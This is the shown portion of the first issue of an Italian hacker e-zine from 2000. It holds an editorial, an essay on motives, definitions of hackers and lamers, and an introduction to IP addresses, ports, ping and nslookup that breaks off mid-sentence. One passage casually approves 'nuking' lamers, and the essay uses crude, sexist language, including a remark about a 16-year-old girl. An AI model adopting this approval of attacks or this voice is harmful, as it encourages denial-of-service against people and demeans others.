Siete dispersi nella rete? Internet vi spaventa al punto da chiamare il 113  ogni volta
che accendete il modem? Pensate che una volta preso un virus dovrete consumare una scatola
di VIVIN C? ......
                  Bene niente paura....questo è un lavoro per......
                     _______________________________________
                    / _____________________________________ \                                                          / /                                   \ \
                   / /                                     \ \
                  / /          __________________           \ \
                 / /          |******************|           \ \ 
                / /           |***_______________|            \ \
               / /            |***|                            \ \
              / /             |***|                             \ \
              \ \             |***|_______________              / /
               \ \            |*******************|            / /
                \ \           |________________***|           / /
                 \ \                          |***|          / /
                  \ \                         |***|         / /  
                   \ \                        |***|        / /
                    \ \        _______________|***|       / /
                     \ \      |*******************|      / /
                      \ \     |___________________|     / /
                       \ \                             / /
                        \ \                           / /
                         \ \                         / /
                          \ \    SECURITY SYSTEM    / /
                           \ \          1          / /
                            \ \___________________/ /
                             \_____________________/
						
             

          (r) * * * R I V I S T A    E L E T T R O N IC A * * * * (r)
              *                  SECURITY SYSTEM                *
          (r) * * * * * * * * * * * * * * * * * * * * * * * * * * (r)
                LA S.S. NON SI ASSUME NESSUNA RESPONSABILITA' PER 
          L'UTILIZZO DEI DATI SOTTO RIPORTATI. LE INFORMAZIONI QUI
          CONTENUTE SONO DISTRIBUITE UNICAMENTE PER SCOPO INFORMATIVO.
          NON INCORAGGIAMO NESSUNO A COMMETERE COSE ILLEGALI, ANZI
          SIAMO I PRIMI A CONDANNARE TALI ATTI. PERTANTO NON CI RITENIAMO
          RESPONSABILI PER EVENTUALI DANNI A COSE E/O PERSONE CHE
          DA ALCUNI DATI CONTENUTI IN QUESTA RIVISTA POSSANO SCATURIRE E
          COMUNQUE DAL CATTIVO USO DI ALCUNE INFORMAZIONI. SE SEI CONTRARIO
          A QUESTO GENERE DI INFORMAZIONI NESSUNO TI OBBLIGA AD ANDARE AVANTI
          CANCELLA QUESTO FILE E LEGGI TOPOLINO O MEGLIO BIANCANEVE E I 7 NANI.
                           DETTO QUESTO.......BUONA LETTURA!  

					 

EDITORIALE
===========
Salve ragazzi! 
Non ci conosciamo ma lo faremo subito! Vi starete chiedendo: chi siamo
e cosa vogliamo.
Bene cercherò di rispondervi.
Vi racconterò la nostra storia: creiamo un po' di atmosfera.....

Cyberspazio, ultima frontiera, dicembre 1999, 1.30 di notte; fuori 
piove a dirotto, dentro pure (ho i buchi nel soffitto...maledetto 
muratore). Alcuni baldi netsurfers si incontrano casualmente in un
canale di hacking alla ricerca disperata di informazioni e come al 
solito sembra di essere in un lagher nazista.
Nessuno si sbottona, nessuno parla, nessuno insegna...silenzio, solo
uno straziante silenzio. Nell'animo dei baldi netsurfers si insinua
una terribile depressione: come è possibile anche nel cyberspazio
esiste la gelosia, la paura di insegnare, il timore di diffondere 
l'informazione...ebbene si! Ogni mondo è paese. Bene i baldi 
netsurfers prendono una decisione, qualcosa che avrebbe cambiato per 
sempre la loro cyberesistenza: fondiamo un gruppo!

E' così è stato. 

Hackers, Magari! Non possiamo definirci hackers, questo termine è 
troppo pesante da portare sul groppone, però qualcosa dell'hacker 
abbiamo: l'indole, l'animo, la voglia di libertà e la fame di 
informazioni. Il nostro cervello per quanto piccolo sia
(specie quello di sysfail...eheheh scherzo) è sempre alla ricerca di 
informazioni; scruta sempre l'orizzonte alla ricerca di novità,
curiosità, di misteri.
La domanda che ci attanaglia la mente è PERCHE'. 
Perché la posta elettronica funziona così? Perché servono i protocolli?
Perché linux è meglio di windows? Perché...perché, perchè.
Voi direte: perché non ti fai un po' i cazzi tuoi eheheh?
Sapete, me lo sono chiesto anche io :)).

Riflettete un attimo ragazzi! Cosa è il potere oggi? Denaro? Nooo 
(oddio se vincessi il superenalotto per la gioia arriverei a comprarmi
WINDOWS 2000 ORIGINALE!!!! Ehehh).
Le automobili? Nooo, la mia FIAT 126 di seconda mano è più che 
sufficiente. Allora cosa è il potere? Il vero potere ragazzi è 
l'informazione...ebbene sì l'informazione. Tutto ruota attorno ad essa.
Pensate alla borsa, basta sentire qualche "rumors" e comprare al 
momento qualche azione giusta, per arricchirsi; conoscere in anticipo
i risultati di una partita su cui scommettere mooolti soldi; apprendere
prima di altri di qualche nuova invenzione tipo un farmaco nuovo, un 
vaccino; insomma tutto si basa sull'informazione.
Ne esistono di alcune facilmente reperibili ed altre che per un motivo
o per un altro ci vengono nascoste o rese irraggiungibili. 
Ma sul pianeta terra, nei lontani anni '60 è successo qualcosa di 
assolutamente incredibile: viene creato il più grande contenitore di 
informazioni, qualcosa di inimmaginabile, qualcosa il cui pensiero fa
impallidire la più ampia e la più aggiornata Enciclopedia che al 
confronto sembra un fumetto di Walt Disney. Ebbene si ragazzi nasce 
INTERNET, la rete delle reti, the NET; migliaia e migliaia di 
informazioni che viaggiano nel suo affascinante mondo: il cyberspazio.
Un mondo strano fatto di 1 e di 0 ma nonostante la sua disarmante 
semplicità è altrettanto complesso e ricco di misteri che aspettano 
solo di essere scoperti! 
La cosa che subito colpisce di Internet è la sua vastità, niente fino
ad ora è stato così immenso, così variopinto, così incontrollabile,
così strano. Questa è la Rete delle reti: libertà, anarchia, 
informazione, potere!! E' questa l'atmosfera che ci spinge a cercare, 
scoprire, sperimentare, sfidare. Molti ci definiscono persone strane,
alienate, privi di vitalità e di voglia di vivere.
Ehhh come si sbagliano!!! Non possono capire il nostro mondo. 
Non possono capire i nostri viaggi. 
Per questo si dice che hackers si nasce e difficilmente si diventa.
Questo è il cuore, la mente, l'anima di un hacker.
libertà in tutte le sue forme!!!!
Allora cari lettori siete con noi siete sicuri di voler entrare nel 
magico mondo della Rete? Siete pronti a viaggiare con noi in giro per il pianeta?
Siete pronti allo shock del cyberspazio? Siete pronti a 
conoscere i segreti di INTERNET?



Questo è il numero uno di Security System!

Bene netsurfers, cosa ci proponiamo con questa rivista? Bè siamo 
sinceri, ancora non lo sappiamo.
Il nostro desiderio sarebbe trasmettervi l'entusiasmo che abbiamo, il
brivido che ci prende quando il nostro modem comincia a emettere quei
suoni strani, quella lingua straniera.
Vorremmo cercare di portarvi i segreti di Internet in maniera semplice
e completa seguendo un filo logico nell'affrontare i vari argomenti. 

Tratteremo i vari temi partendo dal loro utilizzo "classico", 
spiegandone il funzionamento per poi toccare gli aspetti più nascosti
ciò che avreste voluto sapere e che nessuno vi ha mai detto.
Tratteremo SICUREZZA si ragazzi, il nostro intento è riuscire a farvi
sopravvivere nella Internet Land, sapendo come ci si difende da 
intrusioni e di conseguenza vedremo come attaccare.
Inevitabilmente molti degli argomenti trattati alla fine rientrano in 
ciò che viene definito HACKING ma questo è solo un incidente di 
percorso hehehehehe.
Securiry System non tratterà solo argomenti di sicurezza o di hacking,
non parleremo solo di back orifice e shell, spesso troverete nostre opinioni,
nostre considerazioni, nostri modi di vedere le cose, persone, 
situazioni, insomma parleremo di VITA.......
Se uscirà un secondo numero, nessuno può dirlo. Sarebbe bello ricevere
la vostra attenzione, se così non fosse vuol dire che abbiamo fallito
ma almeno ci abbiamo provato! Molti argomenti trattati sono estremamente
tecnici e difficili da comprendere ma noi faremo del 
nostro meglio prima nell'erudirci nel modo più completo e poi nel 
trasmettervelo nel modo più semplice... Compito arduo ma eccitante!!!
Non siamo esperti, non studiamo queste cose per professione, ma solo 
per passione quindi fin da ora ci scusiamo per eventuali puttanate 
anzi vi saremmo grati se ci comunicaste errori, consigli, giudizi! 
Spero lo facciate nel modo più intelligente possibile, senza offese o 
stronzate varie; vi dirò di più, credete che di un argomento ne sapete
di più, bene comunicatecelo ed eventuali vostri articoli, correzioni 
ecc... saranno subito inseriti.
Il nostro desiderio è quello di crescere, crescere insieme a VOI!!!
Partiamo subito.


     =============================================================
--== * * * * * * * * * * * S O M M A R I O * * * * * * * * * * * * ==--
     =============================================================

1]  La provocazione					 	BY ][^XaBaRaS^][

2]  Introduzione						 	BY STAFF

3]  Le Figure di internet (Hackers, Lamers, Wannabe) 	BY ASTURIAS

4]  Fondamenta						 	BY ][^XaBaRaS^][

5]  La rete, questa sconosciuta				BY ACIDO

6]  Anonimato su internet: presto fatto		 	BY ASM

7]  Posta elettronica					 	BY MERLINUS

8]  Ftp: tutto quello che avreste voluto sapere		BY ][^XaBaRaS^][

9]  Bugs ed exploits					 	BY SySF4|L

10] CGI scanner X LINUX					 	BY SySF4|L

11] Hacking Pratico					 	BY ][^XaBaRaS^][

12] Pensieri: la nuova telenovella			 	BY ][^XaBaRaS^][

13] Della serie i Logs di IRC: incontri: parte I	BY STAFF

______________________________________________________________________________


= *************************************************************************** =
= ======================== [ LA PROVOCAZIONE ] ============================== =
= *************************************************************************** =

Autore: ][^XaBaRaS^][
[ 31 Luglio 2000 ]

Ci avete mai pensato a come agisce oggigiorno la società e le persone che la
formano? Tutti fanno qualcosa solamente se hanno altro in cambio... un
tornaconto. Perchè fate un piacere ad un amico? Perchè in futuro (più o meno
lontano) potrebbe ricambiarvelo. Perchè dite ti amo alla vostra ragazza?
Perchè lei ve la da. Perchè prestate il "Black Album" dei Metallica al vostro 
vicino di casa? Ma perchè non avete Kill'em All ed in futuro saprete a chi 
chiederlo per ascoltarlo. Ma provate ad immaginare per un attimo,
per un attimo soltanto se il vostro vicino Metallaro non vi ricambiasse il
piacere.... più in là nel tempo gli prestereste Garage inc. ? (un altro
cd dei Metallica per i novizi). Se la vostra ragazza non vi concedesse la
possibilità di farla godere (e soprattutto DI farVI godere) le direste
più ti amo?? Beh... io dico che passereste più tempo a convincerla di
darvela piuttosto che riempirla dell'amore che vorrebbe. Ehi non fraintendete!
E' la natura umana.... anche io mi son comportato così (e molto probabilmente
lo rifarei semmai avessi una ragazza :). Certamente è anche vero che se voi
volete TUTTO o NIENTE, mentre lei si contenta da una scala da 1 a 10 di darvi
7, potreste anche farle lo sgarbo di non concederle questo piacere (stardi
dentro :)... e gli effetti si capovolgerebbero; vedrete lei convincere voi
che il 7 è un livello PIU' che accettabile per il momento (momento che secondo 
la tipa dovrebbe durare all'incirca un altro paio di anni). Le donne sono così 
come noi, siamo tutti esseri umani, ognuno ha le sue debolezze personali, ma 
tutti ne abbiamo altre che ci accomunano, all'infuori del sesso (e qui intendo 
TUTTI i sessi) o della religione. Vi siete mai scambiati i numeri di cellulare 
con una ragazza? Beh spero di si per voi. Ma se lei vi fa uno squillo e voi 
non ne fate seguire un altro non sentirete più suonare la vostra dolce 
suoneria almeno fino a quando non lo ricambierete! Lo stesso vale per noi 
maschietti. A questo mondo nessuno fa niente per niente e nessuno fa niente per 
nessuno se non ha un introito (in money, in natura o di altro tipo :D   ). Ok 
sembra un discorso un pò egoistico, ma non venitemi a dire "si io ho fatto 
qualcosa per qualcuno senza chiedere nulla in cambio"... ma nel momento in cui 
avrete bisogno, chiederete sempre aiuto (in onore del piacere concesso tempo 
addietro) anche se inconsciamente, ed il vostro "io" sarà appagato e non vi 
sentirete dei pezzi di merda profittatori! Vi capisco sapete? Ripeto, siamo 
tutti esseri umani, ma questo sfogo non vuole essere un accanimento contro i 
vostri cervelli andati in paranoia; se leggete questa rivista vorrà dire che 
i vostri interessi sono ben radicati ed orientati verso una direzione, di 
conseguenza vi aspettate che venga la domanda ed il discorso cool! Ebbene, 
siccome sono abituato a pensare che certe cose prima di essere sperimentate in 
programmazione o nel mondo del computer in generale hanno bisogno di trovare un 
riscontro che possa renderne l'idea anche nella vita reale.... adesso arriverà 
la domanda che dovrebbe farci ragionare per tutto il resto dell'articolo, fino 
alla sua fine (che prevedo sarà breve): perchè volete imparare l'hacking o 
conoscere (detto in modo rozzo) i ferri del mestiere che vi permetterebbero di 
raggiungere una conoscenza (spero che Security System sarà all'altezza) nel 
campo della sicurazza informatica??? Qual è il vostro tornaconto? Prima di 
utilizzare un solo programma, prima di utilizzare un solo scanner inserito 
in questa rivista (anche se per questo numero non ne prevedo molti)... fatevi 
questa cazzo di sacrosanta domanda!! Fatevela 100 volte... e se per 100 volte 
vi risponderete "perchè voglio difendere i sistemi imparando direttamente dai 
trucchi degli hacker", non sarà mica che questo pensiero inconscio serva ad 
appagare il vostro "io" e farvi sentire meno pezzi di merda?!! Della serie 
chi cammina con lo zoppo impara a zoppicare. Non voglio dire che non credo 
affatto a questa risposta... voglio solo dire che nella vita cerchiamo sempre 
di mettere tutto ai nostri occhi in una luce più appagante; voi non penserete 
mai che sia cosa cattiva convincere una povera ragazza di 16 anni che non 
vuole darvela, a perdere la sua verginità! Non penserete mai che sfondare un 
sistema di proposito potrebbe far perdere il posto di lavoro ad un povero 
cornuto che si spacca il culo tutto il giorno per dare una vita dignitosa a 
quella bagascia di sua moglie e quel drogato di suo figlio! Voi non 
penserete mai a queste cose.... e NEMMENO IO!! Fare hacking o curare la 
sicurezza dei sistemi non significa nascondersi dietro uno specchio... così 
facendo non contribuiamo ad altro che alimentare la fornace delle cazzate da 
cui i giornalisti (la maggior parte) di mezzo mondo attingono fuoco
per bruciare le menti delle masse. Putroppo anche io sono fatto di carne
ed ossa, anche io sbaglio, anche io sono come voi. Per fare in modo che
certi atteggiamenti cambino (non mi aspetto nella vita reale ma almeno
per quanto riguarda gli argomenti trattati in questa rivista).... voi 
per quale motivo leggete Security System?? Scrivete 2 righe di parole e
sbattetele in una e-mail e fateci sapere che tipo di lettori ci stiamo
coltivando. 

E finitela di takkare #tgm cazzoni!!

							][^XaBaRaS^][
						     Metal Up Your Ass


= *************************************************************************** =
= ============================= [ INTRODUZIONE ] ============================ =
= *************************************************************************** =
Autore: Staff

In Basso Troverete una piccola descrizione degli articoli nominati sopra:

1) Asturias ci chiarirà un pò le idee sui vari personaggi che affollano internet,
   i famosi hacker. Purtroppo questo termine, il più delle volte viene usato
   impropriamente....vediamo perchè.
2) ][^XaBaRaS^][  dal canto suo farà una carrellata dei principi generali che la Rete usa:
   server, client, porte di servizi, indirizzi IP, server DNS...insomma l'A-B-C di
   Internet.
3) Acido ci spiegherà come Internet funziona, quali sono i tipi di collegamento
   e quali servizi Internet offre. Vedremo, anche in seguito quali protocolli
   vengono usati tipo posta elettronica (SMTP), ftp, ecc.
4) Credevate che la navigazione su Internet fosse anonima? Ehhhh, quanto vi sbagliate.
   Se non state attenti viaggiando qui e là, lasciate anche la taglia delle vostre 
   mutande! AsM ci svelerà come renderci Anonimi....
5) Merlinus, continuerà con il protocollo SMTP, in parole povere la cara
   e famosa posta elettronica. Vediamo come funziona veramente.
6) Iniziamo con ][^XaBaRaS^][ la descrizione dettagliata di quelli che sono i vari servizi
   o meglio i vari protocolli di Internet: ftp visto al microscopio.
7) Sysfail descriverà la differenza tra i BUG e gli EXPLOIT, mostrandoci come siano
   (da un lato purtroppo, dall'altro per fortuna) comuni gli errori anche nei sistemi
   definiti sicuri. Infatti di sicuro su Internet non c'è nulla, se non i soldi che
   la Telecom ci fotte nelle connessioni...:)
8) Doppietta di Sysfail che con un bel programmino ci permetterà di eseguire scansioni
   di cgi. 
9) Ancora ][^XaBaRaS^][, consigli e trucchi....leggete gente, leggete.

Questo è tutto....buona lettura e ricordatevi...niente cazzate!!!!

										By Staff

= *************************************************************************** =
= =========== [ LE FIGURE DI INTERNET (HACKER, LAMER, CRACKER) ] ============ =
= *************************************************************************** =

Autore: Asturias
Luglio 2000

CHI è L'HACKER
================
La prima domanda che ci si pone innanzitutto è cosa è un hacker...
una figura avvolta dal mistero, preparato sui computer, sulla 
programmazione, sui sistemi operativi e sopratutto sulla rete, sempre
umile, curioso e assetato di conoscenza.
Uno studioso che costruisce, sperimenta e si adatta, dotato di una 
notevole elasticità mentale, che osserva vede e trae conclusioni;
che non si ferma ad osservare il lato esteriore delle cose, ma a 
conoscerle in profondità per scoprirne i lati nascosti.
Un esploratore della rete, un profondo conoscitore, un minuzioso 
scopritore che sa dove, e come vedere oltre i limiti preposti da 
schemi precostruiti, che apre delle porte nascoste superando ogni 
limite e ogni regola.
Insoma hacker non è solo preparazione, è uno stile, un modo di vivere,
è un credo, praticato da persone intrepide, pionieri che cercano se 
stessi in un mondo sconfinato come la rete.
Eppure viene abusato di questo termine per etichettare chi provoca 
danni.
Ovvero quelle persone che utilizzano quelle poche conoscenze per 
creare disagi ai sistemi altrui.

HACKER - LAMER - CRACKER
=======================
Come detto sopra ci sono persone che confondono l'hacker con dei lamer,
ma cosa è un LAMER??  Quale valore viene dato a questa parola??

La parola lamer viene usata per definire vari comportamenti; 
innanzitutto per indicare quel tipo di mentalità distruttiva; chi
cerca di arrecare danno ai sistemi altrui, chi vanta conoscenze che 
non possiede, ma sopratutto chi si spaccia per HACKER.
Insomma lamer è un "incompetente", un teppista della rete che usa e 
abusa di programmi realizzati da altri al solo scopo distruttivo.
Purtroppo i mezzi di comunicazione di massa confondono questi principi
e i due nomi, attribuendo così agli HACKER atti di vandalismo in rete,
di cui non sono responsabili.
Per lo stesso significato oltre alla parola lamer viene talvolta usata
la parola CRACKER;
Questa usata pure per indicare persone che praticano il cracking, cioè
sproteggere i giochi o programmi da varie chiavi, protezioni messe 
dalla casa produttrice.
Personalmente per evitare confusione io uso questa parola in funzione
del secondo significato.

WANNABE
========
Per wannabe invece si intende l'apprendista hacker il giovane brillante
che cerca di avvicinarsi nell'affascinante mondo della rete. 

WANNABE O LAMER... QUESTO E' IL DILEMMA..
=============================================
Se avrete occasione (e la fortuna) di diventare bravi, sicuramente vi 
capiterà che qualcuno che possiede meno conoscenze, venga a chiedervi 
delle dritte; ma.... per farne cosa?!?
Lì deve scattare il vostro sesto senso ANTI-LAMER, può succedere che vi
venga chiesto qualcosa di generico; oppure delle cose ben precise ma a
scopo di danno, lì si differenzia il wannabe dal lamer, il wannabe 
cercherà di chiedervi informazioni generali su funzionamenti di certe 
cose il lamer invece domande ben precise per creare danni tipo qual'è
l'ultimo Nuke per WINZOZZ.
Sappiate comportarvi di conseguenza io molte volte rispondo seccato da
questa cosa, se mi trovo in un canale dove sono op un bel kick non 
glielo leva nessuno :o).


ENTRATE NELL'OTTICA
======================
Provate, imparate, sperimentate, smanettate, la giusta ottica è avere la 
mentalità aperta essere brillanti ma sopratutto MODESTI, mai vantarsi
di SHELL HACKATE o per aver fatto un TAKE OVER ad un canale, se no da
Hacker passerete ad essere Lamer (con la L maiuscola).
La presunzione limita le persone e non ci permette di migliorare.
Usate le "armi" solo per difesa o per dare qualche lezione ai lamer in
erba :o)) (se vi capita nukkateli pure vi do' il permesso io :o))))

NON DIVENTATE LAMER
Entrate in chat e marpionate tante tipe ehehehehe

OK vah facciamo le persone serie, in sostanza se volete avere il titolo
di hacker cercate di meritarvelo prendendo coscienza del peso che 
questo nome impone.

Concludo, dicendo che se praticherete questa passione con amore vi darà
grandi soddisfazioni.
Entrate nella giusta ottica, aprite occhi, orecchie e non stancatevi 
mai di imparare.
									 By Asturias^


= *************************************************************************** =
= ================================ [ THE END ] ============================== =
= *************************************************************************** =





= **************************************************************************** =
= =============================== [ FONDAMENTA ] ============================= =
= **************************************************************************** =

Data: 10 Ottobre 2000
Canzoni uniche e immutabili: Alma Mater  - Moonspell -
                             Bright Eyes - Blind Guardian -                 
Autore: ][^XaBaRaS^][

La situazione è la seguente: per quel che mi riguarda il primo numero di
Security System sarebbe già dovuto uscire i primi di Settembre (e non sto
scherzando). All'appello mancavano due articoli e fin dalla notte dei tempi
avevo avvertito Merlinus che se non fossero arrivati avrei potuto scriverli
io, ignaro del periodaccio che si stava abbattendo sulla mia testa come
una spada di Damocle. Il periodaccio arrivò ed anche la proposta di 
Merlinus di scrivere un articolo "di base.... molto di base" su Internet, ed
io per via della promessa fatta non potevo certo tirarmi indietro. A questo punto 
le cose appurate da me sono le seguenti:

1) Security System andando avanti così non arriverà nemmeno al secondo numero
2) La tipa che ho seguito per 3 mesi (anche se sporadicamente) gira voce che
   se la faccia con un altro
3) Non riesco a trovare un nuovo lavoro perchè non sono milite esente e tutte
   le società informatiche rompono il cazzo per questo
4) Non ho più una lira
5) Conseguenza di quanto sopra non posso continuare a frequentare la palestra
   di pugilato e di starmene mano nella mano senza attività fisica non se ne
   parla proprio
6) Se la cosa va avanti così molto probabilmente dovrò cominciare a fare siti
   per vedere qualche soldo... e crearli è la cosa che più al mondo mi scazza,
   preferisco della roba un pò più tecnica (Quelli PORNO fruttano di più...eheh
   NdMerlo)
7) Se fosse dipeso al 100% da me questo articolo non sarebbe nemmeno dovuto
   comparire...perchè ovunque annaspiate il culo, di sta roba su Internet
   ne trovate a camionate

A questo punto direi di cominciare e mi scuso fin da ora della banalità
dell'articolo... ma se qua nessuno scrive sto caxxo di numero 1 non esce
mai :D

============================== [ C'ERA UNA VOLTA ] ============================
Quando ancora l'uso del telefono non era del tutto quotidiano e quando ancora non
esistavano i vari "Mi ami.... ma quanto cazzo mi ami... e mi pensi ma quanto
minchia mi pensi" negli anni 50/60, alcuni agenti (non sto parlando dei poliziotti
qui, attenzione) suonavano nelle case della gente per proporre questo nuovo 
apparecchio.

[info fornitami tempo addietro dal padre di un ragazzo che conosco ex adetto 
Telecom]

Da allora l'uso del telefono è diventato straquotidiano, ultraquotidiano, 
insomma credo proprio che ce ne accorgiamo dalle bollette. E bisogna anche dire
che se non fosse mai esistito, oggi ad Internet ci saremmo collegati col cazzo, ed
invece di schiacciare i lamer, avremmo schiacciato le piattole. Eppure, come
quasi un rapporto padre-figlio... Internet distribuito nelle nostre case
attraverso i vari allacciamenti telefonici, ha ereditato qualcosa (io direi
molto :D) da queste scatoline che squillano e fanno piangere molti padri
di famiglia all'arrivo del conto a casa (vale a dire la bolletta :D). I telefoni
squillano perchè qualcuno compone il nostro numero, il quale è UNIVOCO in tutto
il mondo. Vale a dire che se vogliamo chiamare lo 06/774455 saremo CERTI di
contattare una particolare persona e saremo CERTI che al posto suo non
risponderà Megan Gale dall'Australia <--peccato :(. Su Internet è la stessa cosa. 
Per entrare in rete abbiamo bisogno di un qualcosa che ci distingua dagli altri, 
una specie di codice o di numero telefonico. Questo viene chiamato IP ed è 
UNIVOCO ovunque sulla rete, vuole dire che finchè saremo collegati gli unici in 
tutto il mondo ad averlo saremo noi (nel caso di indirizzo dinamico), e lo stesso 
discorso vale anche per chi ha una CDN (indirizzo statico). (Oh cazzo mi par
di fare lezione alle elementari :(

Se qualche stronzo vuole farci cadere o renderci la vita difficile con qualche
DoS attaccando il nostro indirizzo IP, stiamo sicuri che i pacchetti non
sbaglieranno mai target (un pò come la telefonata arriva sempre a destinazione)
dato che possiedono più materia grigia dei cosidetti missili intelligenti 
(diciamo che quelli talvolta fanno i cazzi loro).

Un indirizzo IP è un blocco numerico formato da 4 gruppi numerici (ognuno 
separato dall'altro attraverso un ".") i cui valori vanno da 0 a 255, come
per esempio 212.45.100.17 Un indirizzo di questo genere occupa 32 bit
(cioè 1 byte per ogni gruppo numerico, per un totale di 4 byte, che sono uguali
a 32 bit, in quanto 1 byte è formato da 8 bit).

Adesso non voglio entrare nel merito di discussioni quali indirizzi broadcast,
multicast, anycast, indirizzi riservati, sottoreti, hostID, netID, subnetID
etc.. etc.. in quanto ci stanno in giro un casino di tutorial sulle reti
(anche in italiano) che trattano questi argomenti. Se leggete altre riviste
italiane oltre Security System son sicuro che avrete già capito dove attingere
queste informazioni.

Il protocollo Internet che caratterizza questi indirizzi IP viene
definito anche IPv4 (quel v4 sta per versione 4). Potrete usufruire di questo 
tipo di indirizzi ancora per qualche anno, dato che la loro assegnazione non
serve a soddisfare le esigenze di crescita della grande rete. Con l'IPv4 si
possono distribuire qualcosa come più di un miliardo di indirizzi; la 
complicazione consiste nel fatto che ad ogni provider viene assegnato un 
range di indirizzi che sfrutta a proprio piacimento e che dovrà distribuire 
alla utenza come meglio crede, e questo non fa altro che diminuire il numero
di indirizzi usufruibili. Si è quindi ben pensato di creare una nuova
versione dell'IP definita IPv6 (non domandatemi che fine ha fatto il 5 :D).
Questi sono indirizzi a 128 bit (naturalmente aumenta il numero dei gruppi
numerici) i cui valori non sono più decimali (cioè da 0 a 255) bensì
esadecimali (il chè oltre i numeri dallo 0 al 9 includono anche le lettere
dell'alfabeto A, B, C, D, E, F). Il miliardo di indirizzi assegnabili a questo 
punto si espande ad un numero ancor più vertiginoso. Non è compito di questo 
articolo andare in profondità riguardo questi argomenti (in quanto anche essi 
si trovano un pò ovunque in rete, ma vengono menzionati ugualmente per onore 
di cronaca :D ). Diciamo che dopo l'entrata dell'IPv6 questo coesisterà con 
l'IPv4 per un paio di anni, dopodichè la vecchia versione sarà totalmente 
soppiantata dalla nuova.

A questo punto dovrei introdurre la nozione client-server. Il concetto di base
è semplice e dal canto mio sarebbe una ripetizione rispiegarlo in questo
articolo, in quanto l'ho già fatto su quello che parla del protocollo FTP, 
presente in questa rivista. Quindi direi di passare al concetto di porta. Sappiamo 
che quando ci colleghiamo con un browser come Explorer o Netscape ad un sito 
Internet sfruttiamo un determinato servizio definito Web. Allo stesso modo se 
apriamo un client ftp e lanciamo una sessione sullo stesso sito stiamo sfruttando 
il servizio definito ftp. La domanda quindi sarebbe: come cazzo fanno i vari
client a distinguere i vari servizi? Cioè perchè ho aperto Explorer e mi ha
restituito il sito mentre quando ho aperto il client ftp no? La risposta è
semplice. Esistono le cosìdette porte che vengono sfruttate dai client per
collegarsi al server. Explorer sa benissimo che quando gli viene detto di
collegarsi ad un sito questo deve interpellare la porta 80 del server (web); il
CuteFtp, il Ws_Ftp o qualsiasi altro client ftp sa benissimo che quando gli si
dice di connettersi ad un indirizzo IP deve interpellare invece la porta 21
per accedere al servizio di trasferimento file e così via (tutto ciò a meno
che non specifichiamo noi una determinata porta a cui collegarci). Il TCP e l'UDP
(che sono i 2 protocolli di trasporto della suite TCP/IP) usano entrambi numeri
di porta interi a 16 bit per differenziare i vari servizi di un server. Ciò 
significa che le porte utilizzabili vanno dal range da 1 a 65535. Le porte
vengono divise in 3 gruppi principali:

* quelle definite ben conosciute che vanno dalla 0 alla 1023. Queste porte sono
  controllate e gestite da un organo su Internet chiamato IANA. I server le
  utilizzano per i propri servizi. Talvolta una porta supporta entrambi
  i protocolli (UDP e TCP) anche se ne viene utilizzato solamente uno dei 2.
  Questo è l'esempio del Web Server che assegna la porta 80 per entrambi
  i protocolli anche se poi viene usato nel 100% dei casi solamente il TCP.

* Vi sono poi le porte registrate che vanno dalla 1024 alla 49151. Queste sono
  le porte che vengono spesso utilizzate dai client quando si connettono ad
  un server. La IANA non ha il controllo su di esse.

* Ed infine ci stanno le porte che vanno dalla 49152 alla 65535. Queste vengono
  definite porte effimere e sono riservate per usi futuri.

Qui bisogna però dire una cosa. Non sempre le porte che vanno dalla 1024 in poi
vengono chiamate registrate per tutti i sistemi operativi. Per esempio nei 
sistemi BSD le porte effimere sono quelle comprese tra il numero 1024 e il numero 
5000, mentre per Solaris sono quelle comprese tra 32768 e 65535. Ecco perchè
io tendo ad usare il termine di porta effimera già dalla 1024sima.

I valori delle porte corrispondenti ai vari servizi possono essere consultati
in dei file presenti in tutti i sistemi operativi:

- sotto macchine *nix si trovano nel file /etc/services,
- sulle Windows (95/98) tale file si può trovare su C:\WINDOWS\Services.
- Lo stesso discorso vale per NT...fate un find file che cerchi Services.

Non incollo questo file per il semplice fatto che OVUNQUE...e DICO OVUNQUE
è reperibile e poi altre riviste italiane lo hanno già incollato e
reincollato centinaia di volte nei propri articoli. 

Questo che ho menzionato è lo standard; poi niente e nessuno vieta ad un
amministratore di poter specificare una porta diversa per un dato servizio
e niente e nessuno vieta ad uno smanettone di poter inserire un servizio
malizioso in una porta superiore alla 1023 :D 

L'affiancamento:

indirizzo IP + porta 

viene definito "socket", mentre quello:

indirizzo IP server + porta server e indirizzo IP client + porta client  

viene definito "coppia socket".

Le persone che usufruiscono da pochissimo tempo di un collegamento ad internet 
avranno da ridire su quanto ho detto prima, perchè loro quando si connettono ad un 
sito tramite l'amato Internet Explorer non scrivono un indirizzo
IP numerico, bensì un hostname come per esempio www.minimumsecurity.com
Effettivamente è più semplice ricordare un nome che un numero, ecco perchè
vengono utilizzati gli hostname dei server. Quel che sta però alla base di
ciò è che, ogniqualvolta specifichiamo un sito sottoforma di stringa
alfanumerica (vuoi perchè è più comodo da ricordare, vuoi perchè ci piace
così), il client fa il lookup di quel nome e lo converte in indirizzo IP: fa
quello che in gergo chiamiamo risoluzione. Questo accade perchè il client
ha comunque bisogno di un indirizzo IP per contattare il server e farci
restituire le pagine html. La risoluzione di un indirizzo IP avendo un
hostname ed un dominio (che d'ora in poi chiameremo FQDN [Fully Qualified Domain
Name]) è un'operazione semplice che possiamo fare con un ping:

C:\WINDOWS\DESKTOP> ping haxxor.xabaras.net

Esecuzione di Ping 192.168.0.3 con 32 byte di dati:

Risposta da 192.168.0.3: byte=32 durata<10ms TTL=128
Risposta da 192.168.0.3: byte=32 durata<10ms TTL=128
Risposta da 192.168.0.3: byte=32 durata<10ms TTL=128
Risposta da 192.168.0.3: byte=32 durata<10ms TTL=128

Adesso sappiamo che l'indirizzo IP di risoluzione di haxxor.xabaras.net è
192.168.0.3

Un pò meno utilizzato dalle persone normali ma non dagli smanettoni è il
reverse lookup, cioè dall'indirizzo IP risalire allo FQDN, vale a dire l'hostname
+ il dominio. Per le macchine *Nix e per Windows NT (non so se su win2000
si) esiste un tool multiuso chiamato nslookup. Se ce lo avete potete
dargli come parametro sia un IP che un hostname; lui vi farà la
conversione automatica:

[xabino@xabino home]$ nslookup 192.168.0.3

Server:  ns.xabaras.net
Address: 192.168.0.1

Name:    HaXX0r.xabaras.net
Address: 192.168.0.3
Aliases: haxxor.xabaras.net

Qui la cosa è semplice: 
Server ed Address sono rispettivamente il nome del server dns di default ed il 
corrispondente indirizzo IP che useremo per prendere informazioni su 
192.168.0.3. Naturalmente conoscendo la sintassi del comando potremmo anche
specificare un server dns diverso da quello di default. Quello che ci viene
in fine restituito e che comprendiamo è che lo FQDN di 192.168.0.3 è 
HaXX0r.xabaras.net , però dato che anche questo potrebbe risultare complesso da 
